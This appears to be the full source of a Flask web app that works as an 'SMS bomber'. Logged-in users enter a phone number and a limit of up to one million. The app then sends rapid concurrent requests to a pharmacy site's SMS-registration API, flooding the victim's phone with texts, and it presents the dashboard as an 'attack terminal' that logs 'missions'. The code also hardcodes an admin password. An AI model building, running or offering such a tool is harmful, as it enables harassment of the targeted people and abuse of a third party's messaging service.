import os
import time
import sqlite3
import random
import asyncio
import aiohttp
import threading
from datetime import datetime, timedelta, timezone
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(64)
# সেশন সেভ রাখার জন্য (৩০ দিন)
app.permanent_session_lifetime = timedelta(days=30)

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v24_ultra_async.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        # Admin Account (As requested)
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("JaNiNaTo-330"), "active"))
        except: pass

init_db()

# ---------- [CORE ASYNC ENGINE] ----------
active_sessions = {}

async def send_async_request(session_obj, phone):
    api_list = [
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"
    ]
    url = random.choice(api_list).format(phone)
    try:
        async with session_obj.get(url, timeout=5) as response:
            return response.status == 200
    except:
        return False

async def async_bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    async with aiohttp.ClientSession() as session_obj:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            
            if curr['status'] == 'Running':
                # Concurrent requests for speed
                tasks = []
                batch_size = 5 # একবারে ৫টি রিকোয়েস্ট
                for _ in range(batch_size):
                    if active_sessions[key]['total'] < limit:
                        tasks.append(send_async_request(session_obj, phone))
                
                results = await asyncio.gather(*tasks)
                
                for res in results:
                    if res: active_sessions[key]['success'] += 1
                    else: active_sessions[key]['fail'] += 1
                    active_sessions[key]['total'] += 1
                
                now = datetime.now(timezone(timedelta(hours=6)))
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                
                if active_sessions[key]['total'] > 0:
                    avg = elapsed.total_seconds() / active_sessions[key]['total']
                    rem = limit - active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg * rem)))
                
                await asyncio.sleep(0.1) # ছোট গ্যাপ
            else:
                await asyncio.sleep(1)

    # Save to Database
    stop_dt = datetime.now(timezone(timedelta(hours=6)))
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

def start_async_loop(username, phone, limit, start_dt):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(async_bombing_task(username, phone, limit, start_dt))

# ---------- [PREMIUM UI DESIGN] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-SYSTEM ULTRA V24</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #010101; --card: #080808; --red: #ff003c; --blue: #00d2ff; --gold: #f39c12; --purple: #a020f0; }
        
        * { box-sizing: border-box; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }

        /* 2S ZOOM-IN OPENING ANIMATION */
        .zoom-entry { animation: zoomIn 2s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes zoomIn {
            0% { transform: scale(0.3); opacity: 0; filter: blur(20px); }
            100% { transform: scale(1); opacity: 1; filter: blur(0px); }
        }

        /* DYNAMIC COLORFUL BANNER */
        .banner-frame {
            margin: 20px auto; padding: 2px; width: 90%; max-width: 500px;
            background: linear-gradient(90deg, var(--red), var(--blue), var(--neon), var(--red));
            background-size: 300% 100%; animation: borderFlow 3s linear infinite;
            border-radius: 15px; box-shadow: 0 0 20px rgba(0, 255, 204, 0.3);
        }
        @keyframes borderFlow { 0% { background-position: 0% 50%; } 100% { background-position: 100% 50%; } }

        .banner-content {
            background: #000; border-radius: 13px; padding: 20px; text-align: center;
        }
        .banner-text {
            font-family: 'Orbitron'; font-size: 2.5rem; font-weight: 900;
            background: linear-gradient(to right, #fff, var(--neon), var(--blue), #fff);
            background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            animation: shine 3s linear infinite; letter-spacing: 5px;
        }
        @keyframes shine { to { background-position: 200% center; } }

        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }

        .nav { 
            background: rgba(0,0,0,0.95); padding: 15px 25px; border-bottom: 2px solid var(--neon); 
            display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; 
        }
        .logo { font-family: 'Orbitron'; color: var(--neon); font-weight:bold; cursor:pointer; }
        
        .menu-dropdown { 
            position: absolute; right: 20px; top: 65px; background: var(--card); border: 1px solid var(--neon); 
            border-radius: 10px; width: 220px; display: none; z-index: 2000; box-shadow: 0 0 30px rgba(0,255,204,0.3); 
        }
        .menu-dropdown a { display: block; padding: 12px 20px; color: #fff; text-decoration: none; font-size: 11px; border-bottom: 1px solid #111; font-family: 'Orbitron'; }
        .menu-dropdown a:hover { background: var(--neon); color: #000; }

        .container { padding: 20px; max-width: 500px; margin: auto; }
        
        .monitor-frame { position: relative; background: var(--card); border-radius: 15px; padding: 20px; margin-bottom: 25px; border: 1px solid #1a1a1a; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        
        input { 
            width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #222; 
            color: var(--neon); border-radius: 10px; font-family: 'Source Code Pro'; outline: none; border-left: 3px solid var(--neon);
        }
        .pass-container { position: relative; }
        .toggle-btn { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); font-size: 12px; }

        .btn-turbo { 
            background: linear-gradient(90deg, var(--neon), var(--blue)); color: #000; border: none; 
            padding: 16px; width: 100%; border-radius: 10px; font-family: 'Orbitron'; font-weight: 900; 
            cursor: pointer; text-transform: uppercase; transition: 0.3s;
        }
        .btn-turbo:hover { box-shadow: 0 0 20px var(--neon); transform: scale(1.02); }

        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .info-box { background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; padding: 12px; border-radius: 8px; text-align: center; }
        .info-box span { display: block; font-size: 9px; color: #666; }
        .info-box b { font-family: 'Orbitron'; color: #fff; }

        .progress-bar { height: 6px; background: #111; border-radius: 3px; margin: 15px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--neon); transition: 0.4s linear; box-shadow: 0 0 10px var(--neon); }
        
        .c-neon { color: var(--neon); } .c-red { color: var(--red); } .c-blue { color: var(--blue); } .c-gold { color: var(--gold); }
    </style>
</head>
<body onclick="document.getElementById('mBox').style.display='none'">
    <canvas id="canvas"></canvas>
    
    <div class="zoom-entry">
        <div class="banner-frame">
            <div class="banner-content">
                <div class="banner-text">RK-SYSTEM</div>
            </div>
        </div>

        <nav class="nav">
            <div class="logo" onclick="location.href='/dashboard'">DASHBOARD V24</div>
            <div style="cursor:pointer;" onclick="event.stopPropagation(); document.getElementById('mBox').style.display='block'">
                <div style="width:25px; height:2px; background:var(--neon); margin:5px;"></div>
                <div style="width:25px; height:2px; background:var(--neon); margin:5px;"></div>
                <div style="width:25px; height:2px; background:var(--neon); margin:5px;"></div>
            </div>
        </nav>

        <div class="menu-dropdown" id="mBox">
            <a href="/dashboard"><b class="c-neon">01.</b> TERMINAL</a>
            <a href="/history"><b class="c-gold">02.</b> HISTORY</a>
            <a href="/profile"><b class="c-blue">03.</b> PROFILE</a>
            <a href="/logout" style="color:var(--red);"><b>!!</b> LOGOUT</a>
        </div>

        <div class="container">[CONTENT]</div>
    </div>

    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "RK-SYSTEM-2026-V24-01"; const fontSize = 15;
        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ffcc'; ctx.font = fontSize + 'px Orbitron';
            for(let i=0; i<drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random()*letters.length));
                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        } setInterval(draw, 50);

        function togglePass(id) {
            let x = document.getElementById(id);
            x.type = (x.type === "password") ? "text" : "password";
        }

        function sync() {
            let area = document.getElementById('live-engine'); if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k]; let p = (s.total/s.limit)*100;
                    html += `<div class="monitor-frame">
                        <div style="display:flex; justify-content:space-between;"><b class="c-blue">${s.phone}</b><span class="c-neon">● ${s.status}</span></div>
                        <div class="progress-bar"><div class="progress-fill" style="width:${p}%"></div></div>
                        <div class="info-grid">
                            <div class="info-box"><span>SUCCESS</span><b class="c-neon">${s.success}</b></div>
                            <div class="info-box"><span>ETA</span><b style="font-size:10px;">${s.eta}</b></div>
                        </div>
                        <div style="display:flex; gap:10px; margin-top:15px;">
                            <button class="btn-turbo" style="font-size:10px; padding:10px; flex:1;" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                        </div>
                    </div>`;
                } area.innerHTML = html;
            });
        } setInterval(sync, 1500);
    </script>
</body></html>
'''

# ---------- [ROUTES] ----------
@app.route('/')
def root():
    if 'user' in session: return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = ""
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session.permanent = True
            session['user'] = u
            return redirect(url_for('dashboard'))
        error = "ACCESS DENIED!"
    return render_template_string(LAYOUT.replace('[CONTENT]', f'''
        <div class="monitor-frame" style="text-align:center;">
            <h3 class="c-neon">SYSTEM LOGIN</h3>
            <p class="c-red">{error}</p>
            <form method="POST">
                <input name="u" placeholder="USERNAME" required>
                <div class="pass-container">
                    <input name="p" type="password" id="l_pass" placeholder="PASSWORD" required>
                    <span class="toggle-btn" onclick="togglePass('l_pass')">SHOW</span>
                </div>
                <button class="btn-turbo">BYPASS & ENTER</button>
            </form>
            <p style="margin-top:15px; font-size:12px;">NO ACCOUNT? <a href="/register" class="c-blue">CREATE ONE</a></p>
        </div>'''))

@app.route('/register', methods=['GET', 'POST'])
def register():
    msg = ""
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            try:
                conn.execute("INSERT INTO users VALUES (?, ?, ?)", (u, generate_password_hash(p), "active"))
                return redirect(url_for('login'))
            except: msg = "USERNAME TAKEN!"
    return render_template_string(LAYOUT.replace('[CONTENT]', f'''
        <div class="monitor-frame" style="text-align:center;">
            <h3 class="c-blue">OPERATOR SIGNUP</h3>
            <p class="c-red">{msg}</p>
            <form method="POST">
                <input name="u" placeholder="CHOOSE USERNAME" required>
                <div class="pass-container">
                    <input name="p" type="password" id="r_pass" placeholder="SET PASSWORD" required>
                    <span class="toggle-btn" onclick="togglePass('r_pass')">SHOW</span>
                </div>
                <button class="btn-turbo">REGISTER SYSTEM</button>
            </form>
            <a href="/login" class="c-neon" style="display:block; margin-top:15px; font-size:12px;">BACK TO LOGIN</a>
        </div>'''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    # type="tel" and inputmode="numeric" for mobile keypad
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="monitor-frame">
            <h3 class="c-neon">🚀 ATTACK TERMINAL</h3>
            <form action="/api/start">
                <input name="num" type="tel" inputmode="numeric" placeholder="PHONE NUMBER" required>
                <input name="amt" type="tel" inputmode="numeric" placeholder="LIMIT (MAX 1,000,000)" required>
                <button class="btn-turbo">EXECUTE MISSION</button>
            </form>
        </div>
        <div id="live-engine"></div>'''))

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if 'user' not in session: return redirect(url_for('login'))
    msg = ""
    if request.method == 'POST':
        old, new = request.form.get('old'), request.form.get('new')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (session['user'],)).fetchone()
            if check_password_hash(user['password'], old):
                conn.execute("UPDATE users SET password=? WHERE username=?", (generate_password_hash(new), session['user']))
                msg = "PASSWORD UPDATED!"
            else: msg = "OLD PASSWORD WRONG!"
    return render_template_string(LAYOUT.replace('[CONTENT]', f'''
        <div class="monitor-frame">
            <h3 class="c-blue">OPERATOR: {session['user']}</h3>
            <p class="c-neon">{msg}</p>
            <form method="POST">
                <input name="old" type="password" placeholder="CURRENT PASSWORD" required>
                <input name="new" type="password" placeholder="NEW PASSWORD" required>
                <button class="btn-turbo">UPDATE ACCESS KEY</button>
            </form>
        </div>'''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT * FROM history WHERE username=? ORDER BY id DESC LIMIT 20", (session['user'],)).fetchall()
    html = '<h3>📜 RECENT MISSIONS</h3>'
    for l in logs:
        html += f'''<div class="monitor-frame">
            <b class="c-neon">{l['phone']}</b><br>
            <small>{l['date_str']} | Success: {l['success']} | Dur: {l['duration']}</small>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        limit = min(int(amt), 1000000) # Max 1M limit
        now = datetime.now(timezone(timedelta(hours=6)))
        key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': limit, 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': '---'}
        threading.Thread(target=start_async_loop, args=(u, num, limit, now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status(): return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user', ''))})

@app.route('/api/stop')
def api_stop():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
